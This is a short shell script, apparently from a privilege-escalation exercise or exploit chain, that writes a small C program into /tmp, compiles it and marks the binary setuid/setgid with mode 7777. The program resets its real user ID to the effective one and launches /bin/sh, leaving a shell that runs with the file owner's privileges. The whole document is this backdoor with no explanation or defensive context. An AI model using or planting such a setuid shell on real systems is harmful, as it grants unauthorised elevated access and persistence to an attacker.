#!/bin/sh


cd /tmp/kookiko/access1

cat<<EOF>/tmp/kookiko/access1/temporary.c
#include <stdlib.h>
#include <unistd.h>


int main()
{
                setreuid(geteuid(),geteuid());
                char* args[] = {"/bin/sh",NULL};
                execv("/bin/sh",args);
}
EOF

gcc /tmp/kookiko/access1/temporary.c -o /tmp/kookiko/access1/basic_shell_owned
chmod 7777 /tmp/kookiko/access1/basic_shell_owned
